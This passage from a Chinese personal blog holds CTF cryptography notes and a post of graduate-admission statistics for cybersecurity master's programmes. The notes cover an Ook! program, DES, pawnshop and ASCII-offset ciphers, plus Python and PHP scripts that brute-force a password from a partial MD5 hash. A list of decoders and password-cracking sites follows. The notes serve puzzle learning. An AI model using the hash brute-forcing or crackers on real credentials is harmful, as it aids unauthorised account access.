Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook!<br>    Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook! Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook! Ook. Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook! Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook! Ook? Ook! Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook? Ook. Ook? Ook! Ook. Ook? Ook. Ook. Ook. Ook. Ook. Ook. Ook. Ook.<br>    Ook. Ook. Ook. Ook. Ook! Ook. Ook? Ook.<br>#DES<br>加密方式:DES<br>密钥:6XaMMbM7<br>密文:U2FsdGVkX18IBEATgMBe8NqjIqp65CxRjjMxXIIUxIjBnAODJQRkSLQ/+lHBsjpv1BwwEawMo1c=<br>如果解密不了，可以换个网站试试，毕竟Des加密时候的填充、编码方式都会影响结果（实测这个网站可以：<a href="http://encode.chahuo.com）" target="_blank" rel="noopener">http://encode.chahuo.com）</a><br>明文:ctf{67a166801342415a6da8f0dbac591974}<br>#SHA1加密</p>
<p>#当铺密码<br>就是一种将中文和数字进行转化的密码，算法相当简单:当铺用的十个数字的暗码是“由”、“中”、“人”、“工”、“大”、“王”、“夫”、“井”、“羊”、“非”十个字。这种暗码是以每一个字上下左右露出的笔画的字头多少来表示数字的。如“由”字上面一竖露出一个头，为数字“一”，“中”字上下露出二个字头，为数字“二”，“羊”字上下左右露出九个字头，为数字“九”，“非”字上下左右共露出十个字头，为数字“十”。如果说“夫井”，那就是在说“七八”这个数字了。<br>密文：羊由大井夫大人王中工<br>明文：9158753624<br>#ascii字符偏移<br>密文<br>gndk€rlqhmtkwwp}z<br>二、分析题目<br>gndk€rlqhmtkwwp}z这个格式像不像flag{<strong>***</strong>}?<br>我们比较一下”gndk”与”flag”的ASCII码<br>gndk的10进制的ASCII码分别是：103 110 100 107<br>flag的10进制的ASCII码分别是  ：102 108  97  103<br>发现ASCII以此减少 1 2 3 4，所以以此类推<br>但是不知道怎么处理’€’这个字符，暂时换成别的字符，最后在换成’{‘<br>用python解解决<br>######八进制，十六进制###小葵工具<br>反斜杠加两位或三位数字，应该是八进制转义序列，八进制转ascii，脚本跑一下<br>\x格式的，看来是16进制，写个脚本16进制转ascii<br>\u开头的16进制Unicode编码，在线Unicode转换字符<br>纯数字应该是ascii码十进制表示，转为字符（注意先把中间的逗号删掉）<br>html转义字符，可以用Python解码（先删掉中间的空格）详细教程可以见Python HTML编码解码</p>
<p>继续Python html解码<br>####残缺的hash值<br>小明一直将电脑密码的哈希值写在纸上，结果一不小心将墨水撒在了上面，只看得到前10位是c2979c7124，小明只记得密码是4位的数字加字母，你能帮小明恢复密码的哈希值吗？（提示：flag为密码的哈希值）</p>
<p>#! /usr/bin/env python</p>
<h1 id="coding-utf-8-3"><a href="#coding-utf-8-3" class="headerlink" title="-- coding: utf-8 --"></a>-<em>- coding: utf-8 -</em>-</h1><p>import string<br>import hashlib<br>import itertools</p>
<p>def md5(cstr):<br>    m = hashlib.md5()<br>    m.update(cstr)<br>    return m.hexdigest().lower()</p>
<p>ls = list(string.lowercase) + list(string.uppercase) + list(string.digits)</p>
<p>s = ‘c2979c7124’<br>for l in list(itertools.permutations(ls,4)):<br>    p = ‘’.join(l)<br>    if md5(p)[0:len(s)] == s:<br>        print md5(p)<br>        exit(0)<br>或者<br>&lt;?php<br>$str=’0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ’;<br>$cou=strlen($str);<br>for($i=0;$i&lt;$cou-1;$i++){<br>        for($j=0;$j&lt;$cou-1;$j++){<br>                for($k=0;$k&lt;$cou-1;$k++){<br>                        for($l=0;$l&#60;$cou-1;$l++){<br>                                $ret=md5($str[$i].$str[$j].$str[$k].$str[$l]);<br>                                if(substr($ret,0,10)==’c2979c7124’){<br>                                        echo $ret;die();<br>                                }<br>                        }<br>                }<br>        }<br>}<br>?&#62;<br>#RSA1<br>#openssl安装方法：<a href="https://www.youtube.com/watch?v=892_4UQy_L8" target="_blank" rel="noopener">https://www.youtube.com/watch?v=892_4UQy_L8</a></p>
<p>列置换</p>
</blockquote>
<p>xssee:<a href="http://web2hack.org/xssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p>
<p> xssee:<a href="http://evilcos.me/lab/xssee" target="_blank" rel="noopener">http://evilcos.me/lab/xssee</a></p>
<p> 程默的博客(DES,3DES,AES,RC,Blowfish,Twofish,Serpent,Gost,Rijndael,Cast,Xtea,RSA):<a href="http://tool.chacuo.net/cryptdes" target="_blank" rel="noopener">http://tool.chacuo.net/cryptdes</a></p>
<p> 在线编码解码(多种并排):<a href="http://bianma.911cha.com" target="_blank" rel="noopener">http://bianma.911cha.com</a></p>
<p> 在线加密解密(多种):<a href="http://encode.chahuo.com" target="_blank" rel="noopener">http://encode.chahuo.com</a></p>
<p> Unicode转中文:<a href="http://www.bejson.com/convert/unicode_chinese" target="_blank" rel="noopener">http://www.bejson.com/convert/unicode_chinese</a></p>
<p> 栅栏密码 &amp;&amp; 凯撒密码 &amp;&amp; 摩斯电码:<a href="http://heartsnote.com/tools/cipher.htm" target="_blank" rel="noopener">http://heartsnote.com/tools/cipher.htm</a></p>
<p> Caesar cipher(凯撒密码):<a href="http://planetcalc.com/1434/" target="_blank" rel="noopener">http://planetcalc.com/1434/</a></p>
<p> Quoted-Printable &amp;&amp; ROT13:<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="noopener">http://www.mxcz.net/tools/QuotedPrintable.aspx</a></p>
<p> ROT5/13/18/47编码转换:<a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php</a></p>
<p> Base32/16:<a href="http://pbaseconverter.com/" target="_blank" rel="noopener">http://pbaseconverter.com/</a></p>
<p> Base32:<a href="https://tools.deamwork.com/crypt/decrypt/base32decode.html" target="_blank" rel="noopener">https://tools.deamwork.com/crypt/decrypt/base32decode.html</a></p>
<p> quipqiup古典密码自动化爆破(词频分析):<a href="http://quipqiup.com/index.php" target="_blank" rel="noopener">http://quipqiup.com/index.php</a></p>
<p> 词频分析/替换:<a href="http://cryptoclub.org/tools/cracksub_topframe.php" target="_blank" rel="noopener">http://cryptoclub.org/tools/cracksub_topframe.php</a></p>
<p> ‘+.&lt;&gt;[]’ &amp;&amp; ‘!.?’(Brainfuck/Ook!):<a href="https://www.splitbrain.org/services/ook" target="_blank" rel="noopener">https://www.splitbrain.org/services/ook</a></p>
<p> ‘+-.&lt;&gt;[]’(Brainfuck):<a href="https://www.nayuki.io/page/brainfuck-interpreter-javascript" target="_blank" rel="noopener">https://www.nayuki.io/page/brainfuck-interpreter-javascript</a></p>
<p> ‘+-.&lt;&gt;[]’(Brainfuck):<a href="http://esoteric.sange.fi/brainfuck/impl/interp/i.html" target="_blank" rel="noopener">http://esoteric.sange.fi/brainfuck/impl/interp/i.html</a></p>
<p> ‘()[]!+’JavaScript编码(JSfuck):<a href="http://discogscounter.getfreehosting.co.uk/js-noalnum.php" target="_blank" rel="noopener">http://discogscounter.getfreehosting.co.uk/js-noalnum.php</a></p>
<p> 用 6 个字符’()[]!+’来编写 JavaScript 程序(JSfuck同上):<a href="http://www.jsfuck.com/" target="_blank" rel="noopener">http://www.jsfuck.com/</a></p>
<p> <a href="http://patriciopalladino.com/files/hieroglyphy/" target="_blank" rel="noopener">http://patriciopalladino.com/files/hieroglyphy/</a></p>
<p> 摩斯密码翻译器:<a href="http://www.jb51.net/tools/morse.htm" target="_blank" rel="noopener">http://www.jb51.net/tools/morse.htm</a></p>
<p> Morse Code摩尔斯电码:<a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/morse.php</a></p>
<p> 摩尔斯电码转换器:<a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></p>
<p> 字符串编码，解码，转换(长度,反转,进制转换):<a href="http://www.5ixuexiwang.com/str/" target="_blank" rel="noopener">http://www.5ixuexiwang.com/str/</a></p>
<p> Cisco Type 7 Reverser:<a href="http://packetlife.net/toolbox/type7" target="_blank" rel="noopener">http://packetlife.net/toolbox/type7</a></p>
<p> Cisco:<a href="http://www.ifm.net.nz/cookbooks/passwordcracker.html" target="_blank" rel="noopener">http://www.ifm.net.nz/cookbooks/passwordcracker.html</a></p>
<p> cmd5 &amp;&amp; NTLM &amp;&amp; mysql…:<a href="http://www.cmd5.com" target="_blank" rel="noopener">http://www.cmd5.com</a></p>
<p> spammimic(字符2一段话):<a href="http://www.spammimic.com/" target="_blank" rel="noopener">http://www.spammimic.com/</a></p>
<p> js代码在线加密解密:<a href="https://tool.lu/js/" target="_blank" rel="noopener">https://tool.lu/js/</a></p>
<p> JScript/VBscript脚本解密(#@<del>^….^#</del>@):<a href="http://www.dheart.net/decode/index.php" target="_blank" rel="noopener">http://www.dheart.net/decode/index.php</a></p>
<p> VBScript.Encode解密(tip:Asp encode):<a href="http://adophper.com/encode.html" target="_blank" rel="noopener">http://adophper.com/encode.html</a></p>
<p> JScript.Encode脚本加密与解密:<a href="http://www.haokuwang.com/jsendecode.htm" target="_blank" rel="noopener">http://www.haokuwang.com/jsendecode.htm</a></p>
<p> ‘+/v+’UTF-7加密:<a href="http://web2hack.org/xssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p>
<p> 各种无知密码解密:<a href="http://www.tools88.com" target="_blank" rel="noopener">http://www.tools88.com</a></p>
<p> uuencode解码 &amp;&amp; xxencode解码(古老的邮件密码):<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="noopener">http://web.chacuo.net/charsetuuencode</a></p>
<p> MIME标准(邮件编码的一种):<a href="http://dogmamix.com/MimeHeadersDecoder/" target="_blank" rel="noopener">http://dogmamix.com/MimeHeadersDecoder/</a></p>
<p> Binhex编码(邮件编码的一种,常见于MAC机):<a href="http://encoders-decoders.online-domain-tools.com/" target="_blank" rel="noopener">http://encoders-decoders.online-domain-tools.com/</a></p>
<p> %u8001%u9525非/u的hex，%u编码，只能编码汉字(xssee):<a href="http://web.chacuo.net/charsetescape" target="_blank" rel="noopener">http://web.chacuo.net/charsetescape</a></p>
<p> 猪圈密码:<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="noopener">http://www.simonsingh.net/The_Black_Chamber/pigpen.html</a></p>
<p> ppencode(把Perl代码转换成只有英文字母的字符串):<a href="http://namazu.org/~takesako/ppencode/demo.html" target="_blank" rel="noopener">http://namazu.org/~takesako/ppencode/demo.html</a></p>
<p> rrencode(把ruby代码全部转换成符号):挂了</p>
<p> aaencode(JS代码转换成常用的网络表情，也就是我们说的颜文字js加密):<a href="http://utf-8.jp/public/aaencode.html" target="_blank" rel="noopener">http://utf-8.jp/public/aaencode.html</a></p>
<p> ‘()[]!+’ &amp;&amp; ‘$=~[]+”_.();’jother编码jjencode(JS代码转换成只有符号的字符串):<a href="http://web2hack.org/xssee" target="_blank" rel="noopener">http://web2hack.org/xssee</a></p>
<p> jother（是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括：! + ( ) [ ] { }。只用这些字符就能完成对任意字符串的编码）:<a href="http://tmxk.org/jother/" target="_blank" rel="noopener">http://tmxk.org/jother/</a></p>
<p> jjencode/aaencode可用xssee &amp;&amp; Chrome的Console模式来直接输出解密。</p>
<p> Manchester曼彻斯特解密：<a href="http://eleif.net/manchester.html" target="_blank" rel="noopener">http://eleif.net/manchester.html</a></p>
<p> Vigenère维多利亚解密：<a href="https://www.guballa.de/vigenere-solver" target="_blank" rel="noopener">https://www.guballa.de/vigenere-solver</a></p>
<p> Vigenère cipher:<a href="http://planetcalc.com/2468/" target="_blank" rel="noopener">http://planetcalc.com/2468/</a></p>
<p> Hill cipher(希尔密码):<a href="http://planetcalc.com/3327/" target="_blank" rel="noopener">http://planetcalc.com/3327/</a></p>
<p> Atbash cipher(埃特巴什码):<a href="http://planetcalc.com/4647/" target="_blank" rel="noopener">http://planetcalc.com/4647/</a></p>
<p> snow(html隐写):<a href="http://fog.misty.com/perry/ccs/snow/snow/snow.html" target="_blank" rel="noopener">http://fog.misty.com/perry/ccs/snow/snow/snow.html</a></p>
<p> Serpent加密解密:<a href="http://serpent.online-domain-tools.com/" target="_blank" rel="noopener">http://serpent.online-domain-tools.com/</a></p>
<p> 十六进制Hex转文本字符串:<a href="http://www.bejson.com/convert/ox2str/" target="_blank" rel="noopener">http://www.bejson.com/convert/ox2str/</a></p>
<p> Hex2text:<a href="http://www.convertstring.com/EncodeDecode/HexDecode" target="_blank" rel="noopener">http://www.convertstring.com/EncodeDecode/HexDecode</a></p>
<p> Binary(二进制)，ACSII,Hex(十六进制),Decimal(十进制):<a href="http://www.binaryhexconverter.com/" target="_blank" rel="noopener">http://www.binaryhexconverter.com/</a></p>
<p> 集合:<a href="http://www.qqxiuzi.cn/daohang.htm" target="_blank" rel="noopener">http://www.qqxiuzi.cn/daohang.htm</a></p>
<p> 集合（各种古典密码）:<a href="http://rumkin.com/tools/cipher/" target="_blank" rel="noopener">http://rumkin.com/tools/cipher/</a></p>
<p> 文本加密为汉字(“盲文”，音符，各种语言，花朵，箭头…):<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="noopener">http://www.qqxiuzi.cn/bianma/wenbenjiami.php</a></p>
<p> 在线繁体字转换器:<a href="http://www.aies.cn" target="_blank" rel="noopener">http://www.aies.cn</a></p>
<p> 在线工具集合:<a href="http://tomeko.net/online_tools/" target="_blank" rel="noopener">http://tomeko.net/online_tools/</a></p>
<p> 二维码/条形码:<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">https://online-barcode-reader.inliteresearch.com/</a></p>
<p> 生成二维码:<a href="http://www.wwei.cn/" target="_blank" rel="noopener">http://www.wwei.cn/</a></p>
<p> 在线二维码解密:<a href="http://jiema.wwei.cn/" target="_blank" rel="noopener">http://jiema.wwei.cn/</a></p>
<p> Image2Base64:<a href="http://www.vgot.net/test/image2base64.php" target="_blank" rel="noopener">http://www.vgot.net/test/image2base64.php</a></p>
<p> 与佛论禅:<a href="http://www.keyfc.net/bbs/tools/tudoucode.aspx" target="_blank" rel="noopener">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
<p> 在线分解GIF帧图:<a href="http://zh.bloggif.com/gif-extract" target="_blank" rel="noopener">http://zh.bloggif.com/gif-extract</a></p>
<p> bejson(杂乱):<a href="http://www.bejson.com" target="_blank" rel="noopener">http://www.bejson.com</a></p>
<p> atool(杂乱):<a href="http://www.atool.org" target="_blank" rel="noopener">http://www.atool.org</a></p>
<p> Punch Card:<a href="http://www.kloth.net/services/cardpunch.php" target="_blank" rel="noopener">http://www.kloth.net/services/cardpunch.php</a></p>
<p> 文件在线Hash:<a href="http://www.atool.org/file_hash.php" target="_blank" rel="noopener">http://www.atool.org/file_hash.php</a></p>
<p>​            </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2019/11/15/%E5%AF%86%E7%A0%81%E5%AD%A6/" data-id="clmvmvop1001l1s7k5v4v0kkg" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-总" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/11/15/%E6%80%BB/" class="article-date">
  <time datetime="2019-11-15T08:51:59.000Z" itemprop="datePublished">2019-11-15</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/15/%E6%80%BB/">总</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>hacker101 </p>
<p><img src="/2019/11/15/%E6%80%BB/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210309104653.jpg" alt="微信图片_20210309104653"></p>
<p>2021年硕士专业目录</p>
<p>研究方向</p>
<p> <strong>吉林大学网络与信息安全考研研究方向</strong> </p>
<p>东南</p>
<h2 id="网络空间安全学院"><a href="#网络空间安全学院" class="headerlink" title="网络空间安全学院"></a><strong>网络空间安全学院</strong></h2><p><strong>083900 网安学硕</strong></p>
<p>【录取69人】</p>
<p>【录取均分367【341-404】】</p>
<p><strong>085400 电子信息</strong></p>
<p>【一志愿进复试74人【含4强军计划】</p>
<p>【录取264人】【含4强军计划】【含203无锡】</p>
<p>【录取均分346【314-394】】</p>
<h2 id="网络空间安全学院-1"><a href="#网络空间安全学院-1" class="headerlink" title="网络空间安全学院"></a><strong>网络空间安全学院</strong></h2><h2 id="083900-网安学硕"><a href="#083900-网安学硕" class="headerlink" title="083900 网安学硕"></a><strong>083900 网安学硕</strong></h2><p>【进复试91人，均分371】</p>
<p>【政英数专平均分：71、69、108、122】</p>
<p>【拟录取54人，均分382】</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXNK1JeYFr7EYGSnUMzOyDMmttrDVQHGrPS5PYLsAXpzZT7QkicCumQZMplaOM6GD4xXLpic5uW8lZg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>085400 电子信息</strong></p>
<p>【进复试248人，均分352】</p>
<p>【政英数专平均分：69、64、98、119】</p>
<p>【招收名额251人】【含7强军+1士兵】【含243无锡】</p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXNK1JeYFr7EYGSnUMzOyDMZqhX5cQtHm5XYObfpSxBeoq3haJwicv62AdbsIkUqMk7bbSfAzpCFIQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><img src="/2019/11/15/%E6%80%BB/%E8%80%83%E5%AD%A6%E7%A7%91%E8%AF%84%E4%BC%B0%E7%BB%93%E6%9E%9C.jpg" alt="考学科评估结果"></p>
<p>3、江南大学青睐好生源调剂生，不保护一志愿。</p>
<p>12、西北工业大学夏令营优秀学生免复试,复试一志愿刷高分。</p>
<p>中国传媒大学 网络空间安全</p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025165352441.png" alt="image-20211025165352441"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025165318709.png" alt="image-20211025165318709"></p>
<p>双非  <strong>408</strong> </p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025165335191.png" alt="image-20211025165335191"></p>
<p>双非 <strong>408</strong> 调剂生比一志愿先复 <img src="/2019/11/15/%E6%80%BB/image-20211025200829905.png" alt="image-20211025200829905">)<img src="/2019/11/15/%E6%80%BB/image-20211025171249598.png" alt="image-20211025171249598"></p>
<p>211 刚改考<strong>408</strong> 分太高不行<img src="/2019/11/15/%E6%80%BB/image-20211025195603083.png" alt="image-20211025195603083"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172003105.png" alt="image-20211025172003105">双非 </p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172034750.png" alt="image-20211025172034750"></p>
<p>211 没有网安 热门</p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172330319.png" alt="image-20211025172330319"></p>
<p>985 数一英一 热门 <img src="/2019/11/15/%E6%80%BB/image-20211025195830803.png" alt="image-20211025195830803"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025180019172.png" alt="image-20211025180019172"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172430662.png" alt="image-20211025172430662">985  数一英一<img src="/2019/11/15/%E6%80%BB/image-20211025200500422.png" alt="image-20211025200500422"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172644698.png" alt="image-20211025172644698">211  热门 艹TM  考毛线 分数线312 358<img src="/2019/11/15/%E6%80%BB/image-20211025200712939.png" alt="image-20211025200712939"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172735268.png" alt="image-20211025172735268">双非 艹TM 考毛线  <img src="/2019/11/15/%E6%80%BB/image-20211025200907818.png" alt="image-20211025200907818"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025172814874.png" alt="image-20211025172814874">高的要死 热门        </p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025173227134.png" alt="image-20211025173227134">211 分数低 刚改考<strong>408</strong><img src="/2019/11/15/%E6%80%BB/image-20211025183926505.png" alt="image-20211025183926505"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025173327522.png" alt="image-20211025173327522">)双非<img src="/2019/11/15/%E6%80%BB/image-20211025194720772.png" alt="image-20211025194720772"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025173429334.png" alt="image-20211025173429334">)双非<img src="/2019/11/15/%E6%80%BB/image-20211025201059397.png" alt="image-20211025201059397"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025173554391.png" alt="image-20211025173554391">211 分数低 <strong>408</strong>  扩招  <strong>不保护一志愿。</strong><img src="/2019/11/15/%E6%80%BB/image-20211025201220279.png" alt="image-20211025201220279"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025174410097.png" alt="image-20211025174410097">211 <strong>408</strong> 扩招  17录5 最低269 <strong>明里暗里打压一志愿</strong><img src="/2019/11/15/%E6%80%BB/image-20211025201324962.png" alt="image-20211025201324962"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025174724612.png" alt="image-20211025174724612">双非 改回数据结构【招生规模260人】</p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025174748936.png" alt="image-20211025174748936">211    <strong>408</strong><img src="/2019/11/15/%E6%80%BB/image-20211025195925159.png" alt="image-20211025195925159"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211025183507213.png" alt="image-20211025183507213"></p>
<p>双非 <strong>408</strong> <img src="/2019/11/15/%E6%80%BB/image-20211025201428907.png" alt="image-20211025201428907"></p>
<p> <img src="/2019/11/15/%E6%80%BB/image-20211025211254886.png" alt="image-20211025211254886"></p>
<p>21年</p>
<p>网络空间安全 22  15一志愿（进复试15人 平均分291）<img src="/2019/11/15/%E6%80%BB/image-20211026131503864.png" alt="image-20211026131503864">+7调剂（35人313-404 均分332）</p>
<p>电子信息 92（？原先扩招前有多少）<img src="/2019/11/15/%E6%80%BB/image-20211026140822654.png" alt="image-20211026140822654">112一志愿 均分334    分数线：<strong>311分</strong><img src="/2019/11/15/%E6%80%BB/image-20211026183136284.png" alt="image-20211026183136284"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211026183455160.png" alt="image-20211026183455160"></p>
<p><a href="https://zhuanlan.zhihu.com/p/372752474" target="_blank" rel="noopener">海南大学2021计算机考研最新数据分析（计算机科学与技术、网络空间安全、电子信息） - 知乎 (zhihu.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s/HC_yhaUXhFYljLzOd_gHGQ" target="_blank" rel="noopener">【院校信息】2021海南大学计算机考研数据汇总 (qq.com)</a></p>
<p>20年 电子信息【进入复试120人，平均分317】</p>
<p>【政英数专平均分：69、68、79、101】</p>
<p>19年<strong>*\</strong>*****网络空间安全******<em>**</em></p>
<p>复试线260，一志愿1人，拟录取16人</p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211027162658941.png" alt="image-20211027162658941"></p>
<p>22年统招名额 网络空间安全 25  电子信息 35</p>
<p>网络空间安全 22  推免3</p>
<p>电子信息 31 推免4<img src="/2019/11/15/%E6%80%BB/image-20211026183253991.png" alt="image-20211026183253991"></p>
<p>为什么别的上岸学长都说软件工程相对于网络空间安全专业，性价比更高</p>
<p>软件工程专硕，考试相对简单，分数也相对高一点，其实都差不多，看自己的选择了</p>
<p>缩招了啊</p>
<p>报录比：报名人数 参加考试人数 初试名单  </p>
<p><a href="https://mp.weixin.qq.com/s/gxZM-pjg73Dl3Szsd7J7_A" target="_blank" rel="noopener">海南大学21年计算机考研情况 网络空间安全招收调剂，数二不能往数一调 (qq.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzc3NzI2Nw==&mid=2247513966&idx=1&sn=78f572c27c61287a2af1c0252ed208c6&chksm=fa3592f2cd421be4331097e3e49d853d8d16463bfa9327a71532f2c4ae49afbc8c933921af50&scene=21#wechat_redirect" target="_blank" rel="noopener">【500小时制作】370所计算机21考研大数据！ (qq.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzc3NzI2Nw==&mid=2247506183&idx=1&sn=6f6512126785ec748074b05768bcc15a&chksm=fa35fc9bcd42758d8799af07711aa34c70e4a4e30955d7997d29132f2a915765483fdfe78055&scene=21#wechat_redirect" target="_blank" rel="noopener">【皮皮灰】21年60所211计算机考研专业目录汇总【上】 (qq.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzc3NzI2Nw==&mid=2247506183&idx=2&sn=f28e1d9097db974dd9e63dde7f914854&chksm=fa35fc9bcd42758d9e0b37158e7593ed7c8fb6e2c125cc777274a656ae5a107d33ee448cfff8&scene=21#wechat_redirect" target="_blank" rel="noopener">【皮皮灰】21年60所211计算机考研专业目录汇总【下】 (qq.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzUyMzc3NzI2Nw==&mid=2247506196&idx=1&sn=38fac76deb996528b78c4625cb1def78&chksm=fa35fc88cd42759e25708e8a0cc328165171b92c5a9cd7059f5fb82f642315112372b7899c3f&scene=21#wechat_redirect" target="_blank" rel="noopener">【21考研】这36所211院校计算机只考一门专业课！ (qq.com)</a></p>
<p><a href="http://suolongkaoyan.info/list/" target="_blank" rel="noopener">蚂蚁设计专业 (suolongkaoyan.info)</a> 6875<img src="/2019/11/15/%E6%80%BB/image-20211027162609219.png" alt="image-20211027162609219"></p>
<p><strong>计算机学院网安学硕：</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/YTd5pk7TLP0icfP2uISYrbWyHeg5dr5NJkQ7R09gFEBtFdfZlW7bYJMF17KxLM4fJZW21YupOgUic7jv0pDrBTKg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>计算机学院电子信息：</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/YTd5pk7TLP0icfP2uISYrbWyHeg5dr5NJFsewggq8AScfPQfntVORTVVd1OJ4TAdrq3Ko7z5H8nTyuRbIr7LcPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>院线：各学科（专业）复试分数线 学院复试实施细则</p>
<p>2021学院复试线：国家线  </p>
<p>学硕：34 34 51 51  253</p>
<p>专硕：34 34 51 51  253</p>
<p><img src="https://pic3.zhimg.com/80/v2-f63bbabc333133615bfeea207472d2dc_720w.jpg" alt="img"></p>
<p><img src="https://pic1.zhimg.com/80/v2-d5c4a1bb5c57797d72742b6d218bc4cb_720w.jpg" alt="img"></p>
<p><img src="/2019/11/15/%E6%80%BB/image-20211026135810893.png" alt="image-20211026135810893"></p>
<p><strong>【灰灰考研22计算机考研择校】</strong></p>
<p><strong><em>\</em>39所985计算机相关专业目录【上】**</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXnic13LwUPyjKc9icI9Ep2AtEZrkgcJvxTQOwo7iaDxqwBPURedpXvicicaeia4piaw4SdbPJRYktO8VAxQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p>**<br>**</p>
<p><strong>39所985计算机相关专业目录【下】</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XXnic13LwUPyjKc9icI9Ep2AtkzczezczqAVqdAjxGpWcEIHrKFtW3jcHPJJeQEQ4ut6GLmGJ30pccA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>【灰灰考研22计算机考研择校】</strong></p>
<p><strong>67所211计算机相关专业目录【1/4】</strong></p>
<p><img src="https://mmbiz.qpic.cn/mmbiz_png/IuvTUD9M1XWXoP8F4aAjPDyoDQb5h4tXUFpMPGwA8EgX3ycPsYYkdI0FXFJ1zerPfkn1qtZcwwlXcZEHrKA0Mw/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1" alt="图片"></p>
<p><strong>67所211计算机相关专业目录【2/4】</strong></p>
